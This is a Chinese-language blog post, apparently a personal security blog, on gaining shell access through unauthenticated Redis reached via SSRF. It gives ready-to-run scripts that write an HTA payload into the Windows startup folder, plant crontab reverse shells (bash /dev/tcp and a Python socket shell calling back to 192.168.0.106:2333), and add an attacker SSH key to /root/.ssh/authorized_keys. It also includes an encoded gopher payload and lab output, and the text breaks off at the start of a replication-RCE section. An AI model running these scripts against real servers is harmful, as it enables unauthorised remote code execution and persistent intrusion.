<!DOCTYPE html><html lang="zh-CN"><head><meta name="google-site-verification" content="DwDg4EuywHWNZUkTC7sG0WGv_UQekM4uRtOoaGuDJHc"><meta name="baidu-site-verification" content="hkLiBHH93D"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="redis getshell实战"><meta name="keywords" content="redis,"><link rel="alternate" href="/atom.xml" title="峰焕亭"><link rel="shortcut icon" type="image/x-icon" href="/favicon_io/favicon.ico?v=1.1"><link rel="canonical" href="https://xiaopo.org/posts/eb21dee.html"><meta name="description" content="ssrf会造成内网漫游，redis作为一种内网常用的中间件易受到攻击，本文主要实践了redis未授权下的攻击和利用，主要从写文件和主从复制RCE两个方面进行了阐述，期间遇到了一些坑，记录下来以飨众人。"><meta property="og:type" content="article"><meta property="og:title" content="redis getshell实战"><meta property="og:url" content="https://xiaopo.org/posts/eb21dee.html"><meta property="og:site_name" content="峰焕亭"><meta property="og:description" content="ssrf会造成内网漫游，redis作为一种内网常用的中间件易受到攻击，本文主要实践了redis未授权下的攻击和利用，主要从写文件和主从复制RCE两个方面进行了阐述，期间遇到了一些坑，记录下来以飨众人。"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://i.loli.net/2020/07/24/TqmCQrOR6ZE8gVh.png"><meta property="og:image" content="https://i.loli.net/2020/07/24/BLlkCrbD8aujJvV.png"><meta property="og:image" content="https://i.loli.net/2020/07/24/YViLD2kGw1CsZoA.png"><meta property="og:image" content="https://i.loli.net/2020/07/24/Vzei6OFRBC8aSGX.png"><meta property="og:image" content="https://i.loli.net/2020/07/24/3TlSW2YkRxQreUf.png"><meta property="og:image" content="https://i.loli.net/2020/07/24/wWsuCKPoB5YF3vj.png"><meta property="og:image" content="https://i.loli.net/2020/07/24/mHsyYI4wLjpgfNh.png"><meta property="og:image" content="https://i.loli.net/2020/07/24/u4rA8xYUHeTRmnt.png"><meta property="og:image" content="https://i.loli.net/2020/07/24/JalBETWkDe8Pm4z.png"><meta property="og:image" content="https://i.loli.net/2020/07/24/l9xEjsLeHcCOvVS.png"><meta property="og:image" content="https://i.loli.net/2020/07/24/zuyqRw4IQxMZ5hO.png"><meta property="article:published_time" content="2020-07-24T22:02:00.000Z"><meta property="article:modified_time" content="2020-08-05T13:53:31.553Z"><meta property="article:author" content="xiaopo"><meta property="article:tag" content="redis"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://i.loli.net/2020/07/24/TqmCQrOR6ZE8gVh.png"><link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1"><link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet"><script type="text/javascript">var themeConfig={fancybox:{enable:!1}}</script><link rel="stylesheet" href="/plugins/highlight/styles/vs2015.css"><script>var _hmt=_hmt||[];!function(){var e=document.createElement("script");e.src="https://hm.baidu.com/hm.js?b733e1eaeacbf8f87d3be047f28c3973";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)}()</script><title>redis getshell实战 - 峰焕亭</title><meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="峰焕亭" type="application/atom+xml">
</head><body><div id="page"><header id="masthead"><div class="site-header-inner"><h1 class="site-title"><a href="/." class="logo">峰焕亭</a></h1><nav id="nav-top"><ul id="menu-top" class="nav-top-items"><li class="menu-item"><a href="/archives">归档</a></li><li class="menu-item"><a href="/about">关于</a></li><li class="menu-item"><a href="/atom.xml">订阅</a></li></ul></nav></div></header><div id="content"><div id="primary"><article class="post"><header class="post-header"><h1 class="post-title">redis getshell实战</h1><time class="post-time">2020-07-24</time></header><div class="toc-container"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#写文件"><span class="toc-text">写文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows"><span class="toc-text">Windows</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#开机自启动"><span class="toc-text">开机自启动</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux"><span class="toc-text">Linux</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#crontab"><span class="toc-text">crontab</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#webshell"><span class="toc-text">webshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ssh-key"><span class="toc-text">ssh key</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#反序列化"><span class="toc-text">反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#主从复制RCE"><span class="toc-text">主从复制RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#原理"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用方法"><span class="toc-text">利用方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lua-RCE"><span class="toc-text">Lua RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tips"><span class="toc-text">Tips</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-text">参考</span></a></li></ol></div><div class="post-content"><p>ssrf会造成内网漫游，redis作为一种内网常用的中间件易受到攻击，本文主要实践了redis未授权下的攻击和利用，主要从写文件和主从复制RCE两个方面进行了阐述，期间遇到了一些坑，记录下来以飨众人。</p><a id="more"></a><h2 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h2><p>写文件这个功能其实就是通过修改redis的dbfilename、dir配置项，通常来说掌控了写文件也就完成了rce的一半，这几种写文件来getshell的方式也是最有效最简单的。</p><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><h4 id="开机自启动"><a href="#开机自启动" class="headerlink" title="开机自启动"></a>开机自启动</h4><p>在Windows 系统中有一个特殊的目录叫自启动目录，在这个目录下的文件在开机的时候都会被运行。</p><pre><code class="vbscript">C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\redis_rce.hta</code></pre><p>笔者把下面这段JScript执行<code>calc</code>命令的代码写到了该目录下，</p><pre><code>&lt;SCRIPT Language=&quot;JScript&quot;&gt;new ActiveXObject(&quot;WScript.Shell&quot;).run(&quot;calc.exe&quot;);&lt;/SCRIPT&gt;</code></pre><p>我们在win测试机上搭建一个有ssrf的漏洞，利用gopher协议发送redis协议流量，我们在Linux上使用socat捕获redis协议流量，windows_startup.sh内容如下，</p><pre><code class="shell">echo -e &#39;\n\n&lt;SCRIPT Language=&quot;JScript&quot;&gt;new ActiveXObject(&quot;WScript.Shell&quot;).run(&quot;calc.exe&quot;);&lt;/SCRIPT&gt;\n\n&#39;|redis-cli -h $1 -p $2 -x set 1
redis-cli -h $1 -p $2 config set dir &#39;C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp&#39;  # 指定本地数据库存放目录
redis-cli -h $1 -p $2 config set dbfilename redis_rce.hta  # 指定本地数据库文件名，默认值为dump.rdb
redis-cli -h $1 -p $2 save
redis-cli -h $1 -p $2 quit</code></pre><p><code>config set dir</code>后面的路径要加引号，否则会报错，加引号之后的报错可以忽略，因为Linux上面没有这个路径。</p><pre><code class="shell">127.0.0.1:6379&gt; config set dir C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp
(error) ERR Wrong number of arguments for CONFIG set
127.0.0.1:6379&gt; config set dir &#39;C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp&#39;
(error) ERR Changing directory: No such file or directory</code></pre><p>在转换流量的时候要把下面的报错信息去掉，</p><pre><code>&lt; 2020/07/23 16:00:40.500366  length=52 from=0 to=51
-ERR Changing directory: No such file or directory\r</code></pre><p>得到gopher协议payload，</p><pre><code class="shell"># xiaopo @ fht in ~/python/POC/ssrf [16:08:46] 
$ python tran2gopher.py socat_windows_startup.log
*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$92%0d%0a%0a%0a&lt;SCRIPT Language=&quot;JScript&quot;&gt;new ActiveXObject(&quot;WScript.Shell&quot;).run(&quot;calc.exe&quot;);&lt;/SCRIPT&gt;%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$60%0d%0aC:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$13%0d%0aredis_rce.hta%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a</code></pre><p>然后还需对上面内容的特殊字符进行url编码，比如%，因为ssrf利用经过了两个协议（先http后gopher），最终payload触发，<br><img src="https://i.loli.net/2020/07/24/TqmCQrOR6ZE8gVh.png" alt="/data/typora_assets/redis/image-20200723164207035.png"></p><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p>以下三种利用方式都需要有写文件权限（这不废话），需要redis以root权限运行。<br>redis原始信息</p><pre><code class="shell">[root@localhost redis]# redis-cli 
127.0.0.1:6379&gt; config get dir
1) &quot;dir&quot;
2) &quot;/var/lib/redis&quot;
127.0.0.1:6379&gt; config get dbfilename
1) &quot;dbfilename&quot;
2) &quot;dump.rdb&quot;
127.0.0.1:6379&gt; get 1
&quot;\n\n12345\n&quot;</code></pre><h4 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h4><p>定时任务目录</p><pre><code class="shell">centos:
/var/spool/cron/root # centos系统下root用户的cron文件，实际测试成功。
/etc/crontab # 该位置的payload需要加root，实际测试成功。
/etc/cron.d/* # 将利用这个目录，可以做到不覆盖任何其他文件的情况进行反弹shell，实际测试成功。

ubuntu：
/var/spool/cron/crontabs/root # debian系统下root用户的cron文件，实际测试不能成功反弹shell。
/etc/crontab # 该位置的payload需要加root，实际测试不能成功反弹shell。
/etc/cron.d/* # 利用这个目录，可以做到不覆盖任何其他文件的情况进行反弹shell，实际测试不能成功反弹shell。</code></pre><p>getshell_crontab.sh内容如下，</p><pre><code class="shell">echo -e &quot;\n\n* * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1\n\n&quot;|redis-cli -h $1 -p $2 -x set 1
redis-cli -h $1 -p $2 config set dir /var/spool/cron/  # 指定本地数据库存放目录
redis-cli -h $1 -p $2 config set dbfilename root  # 指定本地数据库文件名，默认值为dump.rdb
redis-cli -h $1 -p $2 save
redis-cli -h $1 -p $2 quit</code></pre><p>注意：有些系统对 crontab 的文件内容的校验比较严格可能会导致无法执行定时任务，以上代码在centos7下测试成功，</p><pre><code class="shell">[root@localhost redis]# bash getshell_crontab.sh 127.0.0.1 6379
OK
OK
OK
OK
OK

127.0.0.1:6379&gt; get 1
&quot;\n\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.0.106/2333 0&gt;&amp;1\n\n\n&quot;
127.0.0.1:6379&gt; config get dir
1) &quot;dir&quot;
2) &quot;/var/spool/cron&quot;
127.0.0.1:6379&gt; config get dbfilename
1) &quot;dbfilename&quot;
2) &quot;root&quot;</code></pre><p>写入文件<code>/var/spool/cron/root</code>内容如下，</p><pre><code>REDIS0007ú      redis-ver^F3.2.12ú
redis-bitsÀ@ú^EctimeÂ±C^C_ú^Hused-memÂøf^L^@þ^@û^A^@^@À^A:

* * * * * bash -i &gt;&amp; /dev/tcp/192.168.0.106/2333 0&gt;&amp;1


ÿ&lt;91&gt;Å  &lt;87&gt;7^X´g</code></pre><p>在Linux Mint19.3也就是Ubuntu 18.04 LTS上面测试多个目录均无法成功save，</p><pre><code class="shell">root@mint-VirtualBox:/data/hack/B/middleware/redis# bash getshell_crontab.sh 127.0.0.1 6379
OK
OK
OK
(error) ERR
OK</code></pre><p>查看redis运行权限发现是redis用户，</p><pre><code class="shell">mint@mint-VirtualBox:~$ ps -ef | grep redis
redis     1750     1  0 23:22 ?        00:00:00 /usr/bin/redis-server 127.0.0.1:6379
mint      1755  1682  0 23:22 pts/0    00:00:00 grep --color=auto red</code></pre><p>同时从redis配置文件中找到redis log位置，然后查看日志，发现主要原因是只读权限，</p><pre><code>2958:M 17 Jul 16:55:31.014 * 1 changes in 900 seconds. Saving...
2958:M 17 Jul 16:55:31.014 * Background saving started by pid 4151
4151:C 17 Jul 16:55:31.015 # Failed opening the RDB file dump.rdb (in server root dir /var/spool/cron) for saving: Read-only file system
2958:M 17 Jul 16:55:31.115 # Background saving error
2958:M 17 Jul 16:55:37.103 * 1 changes in 900 seconds. Saving...
2958:M 17 Jul 16:55:37.104 * Background saving started by pid 4152
4152:C 17 Jul 16:55:37.105 # Failed opening the RDB file dump.rdb (in server root dir /var/spool/cron) for saving: Read-only file system
2958:M 17 Jul 16:55:37.204 # Background saving error</code></pre><p>停止redis服务，然后sudo运行，查看为root运行权限，</p><pre><code class="shell">mint@mint-VirtualBox:~$ service redis stop
mint@mint-VirtualBox:~$ ps -ef | grep redis
mint      1922  1682  0 23:30 pts/0    00:00:00 grep --color=auto redis
mint@mint-VirtualBox:~$ sudo /usr/bin/redis-server 
1978:C 17 Jul 23:35:34.339 # oO0OoO0OoO0Oo Redis is starting oO0OoO0OoO0Oo
1978:C 17 Jul 23:35:34.339 # Redis version=4.0.9, bits=64, commit=00000000, modified=0, pid=1978, just started
1978:C 17 Jul 23:35:34.339 # Warning: no config file specified, using the default config. In order to specify a config file use /usr/bin/redis-server /path/to/redis.conf
1978:M 17 Jul 23:35:34.340 * Increased maximum number of open files to 10032 (it was originally set to 1024).
mint@mint-VirtualBox:~$ ps -ef | grep redis
root      1977  1682  0 23:35 pts/0    00:00:00 sudo /usr/bin/redis-server
root      1978  1977  0 23:35 pts/0    00:00:00 /usr/bin/redis-server *:6379
mint      1996  1985  0 23:35 pts/1    00:00:00 grep --color=auto redis</code></pre><p>再次运行利用脚本，成功写入<code>/var/spool/cron/crontabs/root</code>，</p><pre><code class="shell">REDIS0008ú      redis-ver^E4.0.9ú
redis-bitsÀ@ú^EctimeÂvÆ^Q_ú^Hused-memÂÈ#^M^@ú^Laof-preambleÀ^@þ^@û^A^@^@À^A:

* * * * * bash -i &gt;&amp; /dev/tcp/192.168.0.106/2333 0&gt;&amp;1


ÿ&lt;9c&gt;^TL¶d¦ª</code></pre><p>奇怪的是，即使成功写入，也并未触发反弹shell，重启cron服务无效</p><pre><code class="shell">sudo service cron status</code></pre><p>查看cron log日志，发现没有开启，找到rsyslog日志中cron部分，去掉前面的#号，重启rsyslog</p><pre><code class="shell">mint@mint-VirtualBox:~$ less -10 /var/log/cron.log
/var/log/cron.log: No such file or directory
mint@mint-VirtualBox:~$ sudo vim /etc/rsyslog.d/50-default.conf
mint@mint-VirtualBox:~$ sudo service rsyslog restart</code></pre><p>cron log日志如下，</p><pre><code class="shell">int@mint-VirtualBox:~$ tail -f /var/log/cron.log
Jul 18 18:33:05 mint-VirtualBox crontab[2035]: (root) LIST (root)
Jul 18 18:34:02 mint-VirtualBox cron[573]: (root) INSECURE MODE (mode 0600 expected) (crontabs/root)</code></pre><p>网上搜索必须”chmod 600”才行，默认的情况好像是644？</p><pre><code class="shell">mint@mint-VirtualBox:~$ sudo ls -l /var/spool/cron/crontabs/
total 4
-rw-r--r-- 1 root root 54 Jul 18 17:36 root
mint@mint-VirtualBox:~$ sudo chmod 600 /var/spool/cron/crontabs/root
mint@mint-VirtualBox:~$ sudo ls -l /var/spool/cron/crontabs/
total 4
-rw------- 1 root root 54 Jul 18 17:36 root
mint@mint-VirtualBox:~$ sudo service cron restart</code></pre><p>然后继续观察日志，</p><pre><code class="shell">Jul 18 19:17:01 mint-VirtualBox CRON[2759]: (root) CMD (   cd / &amp;&amp; run-parts --report /etc/cron.hourly)
Jul 18 19:26:01 mint-VirtualBox cron[2173]: (root) RELOAD (crontabs/root)
Jul 18 19:26:01 mint-VirtualBox cron[2173]: Error: bad minute; while reading crontab for user root
Jul 18 19:26:01 mint-VirtualBox cron[2173]: (root) ERROR (Syntax error, this crontab file will be ignored)
Jul 18 19:27:09 mint-VirtualBox crontab[2843]: (root) LIST (root)</code></pre><p>据上面日志猜测可能是由于crontab文件格式的问题，我们尝试把<code>/var/spool/cron/crontabs/root</code>文件内容改成一条反弹shell的任务，即</p><pre><code class="shell">root@mint-VirtualBox:/data/hack/C/middleware/redis# cat /var/spool/cron/crontabs/root 
* * * * * bash -i &gt;&amp; /dev/tcp/192.168.0.106/2333 0&gt;&amp;1</code></pre><p>相关日志，</p><pre><code class="shell">Jul 18 19:30:01 mint-VirtualBox cron[2173]: (root) RELOAD (crontabs/root)
Jul 18 19:30:01 mint-VirtualBox CRON[2869]: (root) CMD (bash -i &gt;&amp; /dev/tcp/192.168.0.106/2333 0&gt;&amp;1)
Jul 18 19:30:01 mint-VirtualBox CRON[2868]: (CRON) info (No MTA installed, discarding output)
Jul 18 19:31:01 mint-VirtualBox CRON[2881]: (root) CMD (bash -i &gt;&amp; /dev/tcp/192.168.0.106/2333 0&gt;&amp;1)
Jul 18 19:31:01 mint-VirtualBox CRON[2880]: (CRON) info (No MTA installed, discarding output)</code></pre><p>“No MTA installed, discarding output”网上有很多解法，解法1是安装邮件服务器；解法2是把shell命令放到一个文件中，执行该文件，然后重定向到null文件。官方解法见链接</p><p><a href="https://cronitor.io/cron-reference/no-mta-installed-discarding-output" target="_blank" rel="noopener">https://cronitor.io/cron-reference/no-mta-installed-discarding-output</a></p><p>值得注意的是，官方里面说这个错误不会影响任务本身的执行，但是为什么依然没有反弹shell呢，我们试着用其中一种解法<code>MAILTO=&quot;&quot;</code>来解决该错误，然后观察日志，</p><pre><code class="shell">Jul 18 19:38:01 mint-VirtualBox cron[2173]: (root) RELOAD (crontabs/root)
Jul 18 19:38:01 mint-VirtualBox CRON[2964]: (root) CMD (bash -i &gt;&amp; /dev/tcp/192.168.0.106/2333 0&gt;&amp;1)
Jul 18 19:38:20 mint-VirtualBox crontab[2967]: (root) LIST (root)
Jul 18 19:39:01 mint-VirtualBox CRON[2975]: (root) CMD (bash -i &gt;&amp; /dev/tcp/192.168.0.106/2333 0&gt;&amp;1)</code></pre><p>果然没再报错，但是依旧没有反弹shell，是不是反弹shell命令写错了？我们尝试直接执行是没有问题的，<br><img src="https://i.loli.net/2020/07/24/BLlkCrbD8aujJvV.png" alt="/data/typora_assets/redis/20200718194424795.png"><br>后来发现这篇文章，</p><p><a href="https://www.onebug.org/websafe/98675.html" target="_blank" rel="noopener">https://www.onebug.org/websafe/98675.html</a></p><p>里面提到“bash -i反弹shell都失败，不过python，perl可以”，换成python的试一下，确实可以，<br><img src="https://i.loli.net/2020/07/24/YViLD2kGw1CsZoA.png" alt="/data/typora_assets/redis/20200718200550210.png"><br>我们使用python反弹shell试一下ubuntu是否真的会受格式影响，</p><pre><code class="shell">echo -e &quot;\n\n* * * * * /usr/bin/python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;127.0.0.1\&quot;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&#39;\n\n&quot;|redis-cli -h $1 -p $2 -x set 1
redis-cli -h $1 -p $2 config set dir /var/spool/cron/crontabs/  # 指定本地数据库存放目录
redis-cli -h $1 -p $2 config set dbfilename root  # 指定本地数据库文件名，默认值为dump.rdb
redis-cli -h $1 -p $2 save
redis-cli -h $1 -p $2 quit

127.0.0.1:6379&gt; get 1
&quot;\n\n* * * * * /usr/bin/python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;127.0.0.1\&quot;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&#39;\n\</code></pre><p>但是写入到<code>/var/spool/cron/crontabs/root</code>文件的比较怪，</p><pre><code>EDIS0008ú      redis-ver^E4.0.9ú
redis-bitsÀ@ú^EctimeÂ}æ^R_ú^Hused-memÂ¨Ó^L^@ú^Laof-preambleÀ^@þ^@û^A^@^@À^AÃ@Á@ù^C

* À^A^_/usr/bin/python -c &#39;import socke^Qt,subprocess,os;s=&lt;80&gt;^V^@.&lt;80&gt;^F^@(&lt;80&gt;^F^H.AF_INET, ^N^]SOCK_STREAM);s.connect((&quot;127.0 ^A^_1&quot;,2333));os.dup2(s.fileno(),0);^@ à
^V^@1à^M^V^D2);p=à^A¤^G.call([&quot;`Ô^Nsh&quot;,&quot;-i&quot;]);&#39;


ÿáÍëÝîÇpá</code></pre><p>16进制查看，<br><img src="https://i.loli.net/2020/07/24/Vzei6OFRBC8aSGX.png" alt="/data/typora_assets/redis/20200718214546791.png"><br>按照</p><p><a href="https://lorexxar.cn/2016/12/03/redis-getshell/" target="_blank" rel="noopener">https://lorexxar.cn/2016/12/03/redis-getshell/</a></p><p>这篇文章所讲好像发生了截断？但是具体怎么个截断法，没搞明白，是否可能构造出完美payload有待研究？如果写入字符比较少就不会发生截断，例如，<br><img src="https://i.loli.net/2020/07/24/3TlSW2YkRxQreUf.png" alt="/data/typora_assets/redis/20200718220052178.png"><br>最后我们尝试一下，如果不发生截断的情况下写到<code>/var/spool/cron/crontabs/root</code>文件，能否反弹shell，我们手动更改<code>/var/spool/cron/crontabs/root</code>文件内容如下，</p><pre><code class="shell">REDIS0008ú      redis-ver^E4.0.9ú
redis-bitsÀ@ú^EctimeÂ^G^@^S_ú^Hused-memÂè!^M^@ú^Laof-preambleÀ^@þ^@û^A^@^@À^AÃ@Á@ù^C

* * * * * /usr/bin/python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.0.106&quot;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;


ÿ¸l&lt;8e&gt;Ø^Z&lt;9c&gt;&lt;90&gt;</code></pre><p>最后发现是不行的，cron log报时间格式错误、语法错误，<br><img src="https://i.loli.net/2020/07/24/wWsuCKPoB5YF3vj.png" alt="/data/typora_assets/redis/20200718221117435.png"><br>总结：</p><ul><li>centos下可以成功写crontab反弹shell。</li><li>ubuntu下无法写crontab反弹shell，主要原因在于ubuntu对于crontab格式要求比较严格，不允许有语法出错，而redis在写入的时候，在前、后都会附加redis的一些信息；另外就是ubuntu下利用crontab使用bash反弹shell是无法成功的，原因是ubuntu下执行 crontab 使用的是 sh , 而 sh 软连接的是dash ，而不是 bash，那么如果你直接在 cron 里面写 bash - i xx 的反弹是不可能成功的，解决方法有两种，一种就是使用 Python 调用 /bin/sh 反弹 shell ，还有一种可以尝试写 sh 文件，然后用 cron 去执行。利用python可以成功反弹shell，但是python反弹shell的payload比较长，利用redis写到crontab文件的时候会发生莫名的payload截断；最后就是ubuntu用户定时任务必须在600权限才能执行，否则提示INSECURE MODE不予执行。</li></ul><h4 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h4><p>需要知道web目录</p><h4 id="ssh-key"><a href="#ssh-key" class="headerlink" title="ssh key"></a>ssh key</h4><pre><code class="shell"># xiaopo @ fht in ~ [22:20:29] C:130
$ cat ~/.ssh/id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDOVgEY/clVIFD7U/pbZly0jW5PJs6BV8gG6hKvQT3FjQUpMNADHy/MgjIoeBQpCLSRv5fOHSLVdxFgTe8qgX6s8wR1JlLPCgRPAfr8LbpxQcuw5zVqbA9DsYxEf+6Qry+SeZWXOB8tHWSZBMK7BX09g1y/hTEsrd1d/VoPBci8kUsuybqnaoRGz8p4YaJFl+jiI5SIcTb/mJTcyPOK0hFCDL7ylSJLXn/BaT5E8dPuZzj+Oha+k8PabEf0V22Jmt7gDL7e7Omit277liorsNARBH4LccPk9T9cOdmlxMswjEA3+Xbb6f3kgYaxEg6SHEWkSvMyt+x3NM6R76q5H8Nx xiaopo@fht</code></pre><p>sshkey.sh内容如下，</p><pre><code class="shell">echo -e &quot;\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDOVgEY/clVIFD7U/pbZly0jW5PJs6BV8gG6hKvQT3FjQUpMNADHy/MgjIoeBQpCLSRv5fOHSLVdxFgTe8qgX6s8wR1JlLPCgRPAfr8LbpxQcuw5zVqbA9DsYxEf+6Qry+SeZWXOB8tHWSZBMK7BX09g1y/hTEsrd1d/VoPBci8kUsuybqnaoRGz8p4YaJFl+jiI5SIcTb/mJTcyPOK0hFCDL7ylSJLXn/BaT5E8dPuZzj+Oha+k8PabEf0V22Jmt7gDL7e7Omit277liorsNARBH4LccPk9T9cOdmlxMswjEA3+Xbb6f3kgYaxEg6SHEWkSvMyt+x3NM6R76q5H8Nx xiaopo@fht\n\n&quot;|redis-cli -h $1 -p $2 -x set 1
redis-cli -h $1 -p $2 config set dir /root/.ssh/   # 指定本地数据库存放目录
redis-cli -h $1 -p $2 config set dbfilename authorized_keys  # 指定本地数据库文件名，默认值为dump.rdb
redis-cli -h $1 -p $2 save
redis-cli -h $1 -p $2 quit</code></pre><p>以上代码在centos7测试并连接成功，当然前提需要有/root/.ssh/这个目录，</p><pre><code class="shell">[root@localhost redis]# mkdir -p /root/.ssh/
[root@localhost redis]# bash sshkey.sh 127.0.0.1 6379
OK
OK
OK
OK
OK
[root@localhost redis]# redis-cli
127.0.0.1:6379&gt; get 1
&quot;\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDOVgEY/clVIFD7U/pbZly0jW5PJs6BV8gG6hKvQT3FjQUpMNADHy/MgjIoeBQpCLSRv5fOHSLVdxFgTe8qgX6s8wR1JlLPCgRPAfr8LbpxQcuw5zVqbA9DsYxEf+6Qry+SeZWXOB8tHWSZBMK7BX09g1y/hTEsrd1d/VoPBci8kUsuybqnaoRGz8p4YaJFl+jiI5SIcTb/mJTcyPOK0hFCDL7ylSJLXn/BaT5E8dPuZzj+Oha+k8PabEf0V22Jmt7gDL7e7Omit277liorsNARBH4LccPk9T9cOdmlxMswjEA3+Xbb6f3kgYaxEg6SHEWkSvMyt+x3NM6R76q5H8Nx xiaopo@fht\n\n\n&quot;
127.0.0.1:6379&gt; exit
[root@localhost redis]# cat /root/.ssh/authorized_keys 
REDIS0007�    redis-ver3.2.12�
redis-bits�@�ctime²�_used-memh
                                ���A�

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDOVgEY/clVIFD7U/pbZly0jW5PJs6BV8gG6hKvQT3FjQUpMNADHy/MgjIoeBQpCLSRv5fOHSLVdxFgTe8qgX6s8wR1JlLPCgRPAfr8LbpxQcuw5zVqbA9DsYxEf+6Qry+SeZWXOB8tHWSZBMK7BX09g1y/hTEsrd1d/VoPBci8kUsuybqnaoRGz8p4YaJFl+jiI5SIcTb/mJTcyPOK0hFCDL7ylSJLXn/BaT5E8dPuZzj+Oha+k8PabEf0V22Jmt7gDL7e7Omit277liorsNARBH4LccPk9T9cOdmlxMswjEA3+Xbb6f3kgYaxEg6SHEWkSvMyt+x3NM6R76q5H8Nx xiaopo@fht


�B�I$��:[root@localhost redis]# </code></pre><p>在Mint下写入并连接成功，</p><pre><code class="shell">root@mint-VirtualBox:/data/hack/C/middleware/redis# cat /root/.ssh/authorized_keys 
REDIS0008�    redis-ver4.0.9�
redis-bits�@�ctime�Z
�                   _used-mem�$
 aof-preamble����A�

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDOVgEY/clVIFD7U/pbZly0jW5PJs6BV8gG6hKvQT3FjQUpMNADHy/MgjIoeBQpCLSRv5fOHSLVdxFgTe8qgX6s8wR1JlLPCgRPAfr8LbpxQcuw5zVqbA9DsYxEf+6Qry+SeZWXOB8tHWSZBMK7BX09g1y/hTEsrd1d/VoPBci8kUsuybqnaoRGz8p4YaJFl+jiI5SIcTb/mJTcyPOK0hFCDL7ylSJLXn/BaT5E8dPuZzj+Oha+k8PabEf0V22Jmt7gDL7e7Omit277liorsNARBH4LccPk9T9cOdmlxMswjEA3+Xbb6f3kgYaxEg6SHEWkSvMyt+x3NM6R76q5H8Nx xiaopo@fht


�a��/ԡOroot@mint-VirtualBox:/data/hack/C/middleware/redis#</code></pre><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>待补充</p><h2 id="主从复制RCE"><a href="#主从复制RCE" class="headerlink" title="主从复制RCE"></a>主从复制RCE</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>前言：比起以前的利用方式来说，这种利用方式更为通用，危害也更大，因为随着现代的服务部署方式的不断发展，组件化成了不可逃避的大趋势，docker就是这股风潮下的产物之一，而在这种部署模式下，一个单一的容器中不会有除redis以外的任何服务存在，包括ssh和crontab，再加上权限的严格控制，只靠写文件就很难再getshell了，在这种情况下，我们就需要其他的利用手段了。</p><p>redis主从复制：Redis是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。可以通过下来理解，其中<code>slaveof 